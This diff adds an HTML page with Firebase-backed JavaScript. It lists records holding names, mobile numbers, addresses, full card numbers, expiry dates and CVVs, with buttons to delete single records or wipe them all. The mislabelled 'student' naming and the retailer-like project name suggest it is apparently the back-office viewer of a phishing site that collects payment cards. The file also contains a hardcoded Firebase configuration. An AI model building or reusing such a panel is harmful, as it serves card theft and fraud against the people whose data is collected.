@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Expandable Firebase List</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #ece9e6, #ffffff);
+            padding: 20px;
+        }
+
+        .student-container {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+            cursor: pointer;
+            position: relative;
+            transition: all 0.3s ease-in-out;
+        }
+
+        .student-box {
+            padding: 15px;
+            border-radius: 8px;
+            cursor: pointer;
+            max-width: 100%;
+            box-sizing: border-box;
+            flex-grow: 1;
+            background: linear-gradient(135deg, #ffecd2, #fcb69f);
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            transition: all 0.3s ease-in-out;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .student-box:hover {
+            background: linear-gradient(135deg, #fcb69f, #ff9a9e);
+            transform: scale(1.02);
+        }
+
+        .student-box.expanded {
+            background: linear-gradient(135deg, #a1c4fd, #c2e9fb);
+        }
+
+        .hidden-details {
+            display: none;
+            margin-top: 10px;
+            font-size: 14px;
+            color: #333;
+        }
+
+        .delete-button {
+            background-color: #ff4d4d;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            padding: 6px 12px;
+            cursor: pointer;
+            position: absolute;
+            bottom: 8px;
+            right: 8px;
+            font-size: 14px;
+            transition: background 0.3s ease-in-out;
+        }
+
+        .delete-button:hover {
+            background-color: #d63333;
+        }
+
+        #clearAllDataButton {
+            background-color: rgb(233, 11, 11);
+            color: white;
+            border: none;
+            width: 100%;
+            border-radius: 5px;
+            padding: 12px 25px;
+            cursor: pointer;
+            display: block;
+            margin: 0 auto 20px;
+            font-size: 16px;
+            transition: all 0.3s ease-in-out;
+        }
+
+        #clearAllDataButton:hover {
+            background-color: rgb(200, 0, 0);
+            transform: scale(1.05);
+        }
+
+        h2 {
+            color: red;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <button id="clearAllDataButton">Clear All Data</button>
+    <div id="StudentDiv"></div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.3.1/firebase-app.js";
+        import { getDatabase, ref, onValue, remove as removeRef } from "https://www.gstatic.com/firebasejs/10.3.1/firebase-database.js";
+
+         const firebaseConfig = {
+  apiKey: "AIzaSyDlSO9nBy2lM7E3aSJPP0SJs47NVIgokjg",
+  authDomain: "dmart--website-2.firebaseapp.com",
+  projectId: "dmart--website-2",
+  storageBucket: "dmart--website-2.firebasestorage.app",
+  messagingSenderId: "1015919264852",
+  appId: "1:1015919264852:web:e57087d1a5c1410e15d9c1",
+  measurementId: "G-ZKQFCSSJD1"
+};
+
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase();
+
+        let StudentDiv = document.getElementById('StudentDiv');
+        let clearAllDataButton = document.getElementById('clearAllDataButton');
+
+        function setupRealTimeListener() {
+            const studentsRef = ref(db, 'packages');
+            onValue(studentsRef, (snapshot) => {
+                if (snapshot.exists()) {
+                    let students = [];
+                    snapshot.forEach((std) => {
+                        students.unshift(std);
+                    });
+
+                    StudentDiv.innerHTML = "";
+                    students.forEach((std, index) => {
+                        AddStudentAsListItem(std, index);
+                    });
+                } else {
+                    StudentDiv.innerHTML = "<p>No data available</p>";
+                }
+            });
+        }
+
+        function AddStudentAsListItem(std, index) {
+            let value = std.val();
+            let key = std.key;
+
+            let mobileNumber = value.mobileNumber || 'Not available';
+            let name = value.fullName || 'Not available';
+            let address = value.address || 'Not available';
+            let city = value.city || 'Not available';
+            let state = value.state || 'Not available';
+            let pincode = value.pincode || 'Not available';
+            let cardNumber = value.cardNumber || 'Not available';
+            let expiryMM = value.expiryMM || 'Not available';
+            let expiryYY = value.expiryYY || 'Not available';
+            let cvv = value.cvv || 'Not available';
+               let paymentMethod = value.paymentMethod || 'Not available';
+            let timestamp = value.timestamp || 'Not available';
+
+            let containerDiv = document.createElement('div');
+            containerDiv.className = 'student-container';
+
+            let div = document.createElement('div');
+            div.className = 'student-box';
+            div.innerHTML = `<p><strong>Name:</strong> ${name}</p><p><strong>Mobile:</strong> ${mobileNumber}</p>`;
+
+            let detailsDiv = document.createElement('div');
+            detailsDiv.className = 'hidden-details';
+            detailsDiv.innerHTML = `
+                <p><strong>Address:</strong> ${address}</p>
+                <p><strong>City:</strong> ${city}</p>
+                <p><strong>State:</strong> ${state}</p>
+                <p><strong>Pin-Code:</strong> ${pincode}</p>
+                <p><strong>Card Number:</strong> ${cardNumber}</p>
+                <p><strong>Expiry Date:</strong> ${expiryMM} / ${expiryYY}</p>
+                <p><strong>CVV:</strong> ${cvv}</p>
+                 <p><strong>Payment Method:</strong> ${paymentMethod}</p>
+                <p><strong>Time:</strong> ${timestamp}</p>
+            `;
+
+            let deleteButton = document.createElement('button');
+            deleteButton.className = 'delete-button';
+            deleteButton.textContent = 'Delete';
+            deleteButton.addEventListener('click', (event) => {
+                event.stopPropagation();
+                DeleteStudent(key);
+            });
+
+            div.addEventListener('click', () => {
+                let isExpanded = div.classList.contains('expanded');
+                div.classList.toggle('expanded');
+                detailsDiv.style.display = isExpanded ? 'none' : 'block';
+            });
+
+            div.appendChild(detailsDiv);
+            div.appendChild(deleteButton);
+            containerDiv.appendChild(div);
+            StudentDiv.appendChild(containerDiv);
+        }
+
+        function DeleteStudent(key) {
+            const studentRef = ref(db, `packages/${key}`);
+            removeRef(studentRef).then(() => {
+                console.log("Student data deleted successfully");
+            }).catch((error) => {
+                console.error("Error deleting data: ", error);
+            });
+        }
+
+        function ClearAllData() {
+            const packagesRef = ref(db, 'packages');
+            removeRef(packagesRef).then(() => {
+                console.log("All data deleted successfully");
+            }).catch((error) => {
+                console.error("Error clearing all data: ", error);
+            });
+        }
+
+        clearAllDataButton.addEventListener('click', ClearAllData);
+        setupRealTimeListener();
+    </script>
+</body>
+</html>
